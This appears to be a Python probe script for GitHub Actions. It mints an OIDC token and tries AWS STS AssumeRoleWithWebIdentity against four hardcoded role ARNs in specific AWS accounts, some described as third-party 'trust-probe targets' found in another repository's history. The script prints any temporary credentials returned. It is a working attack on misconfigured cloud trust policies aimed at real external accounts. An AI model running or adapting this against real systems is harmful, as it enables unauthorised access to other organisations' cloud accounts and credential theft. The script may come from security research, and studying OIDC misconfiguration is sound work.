#!/usr/bin/env python3
"""prl-t1 i4168: mint one GitHub Actions id_token (aud sts.amazonaws.com) and probe all AWS OIDC
role targets discovered in the c211 repo history (pwnme + 2 non-big3 trust-probe targets + positive control)."""
import json, os, base64, re, urllib.request, urllib.parse

ROLES=[
 ('pwnme','arn:aws:iam::941377144061:role/pwnme-github-role-100'),
 ('kumo-odin','arn:aws:iam::786169356362:role/odin/kumo-external-access-role'),
 ('ibm-ocp','arn:aws:iam::678256850452:role/ocp-sts-role'),
 ('pos-control','arn:aws:iam::420032683002:role/openvdb-fvdb-github-actions-role'),
]

def mint(aud):
    u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
    if not u or not t: raise RuntimeError('oidc env missing')
    url=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote(aud,safe='')
    req=urllib.request.Request(url, headers={'Authorization':'Bearer '+t,'Accept':'application/json','User-Agent':'prl-t1'})
    return json.loads(urllib.request.urlopen(req,timeout=30).read())['value']

def claims(tok):
    p=tok.split('.')[1]; p+='='*(-len(p)%4)
    d=json.loads(base64.urlsafe_b64decode(p))
    return {k:d.get(k) for k in ('iss','sub','aud','repository','ref')}

def assume(role, tok):
    data=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'prl-t1','WebIdentityToken':tok}).encode()
    try:
        r=urllib.request.urlopen('https://sts.amazonaws.com/',data,timeout=40)
        return 'OK %s %s'%(r.status, r.read().decode()[:2500])
    except Exception as e:
        body=getattr(e,'read',lambda:b'')().decode()
        code=re.search(r'<Code>([^<]+)</Code>', body); msg=re.search(r'<Message>([^<]+)</Message>', body)
        return 'ERR %s code=%s msg=%s'%(e, code.group(1) if code else '', (msg.group(1) if msg else body[:200]))

tok=mint('sts.amazonaws.com')
print('RESULT CLAIMS %s'%json.dumps(claims(tok)), flush=True)
for name, role in ROLES:
    print('=== ROLE %s %s'%(name, role), flush=True)
    print('RESULT %s %s'%(name, assume(role, tok)), flush=True)
print('RESULT DONE ok', flush=True)
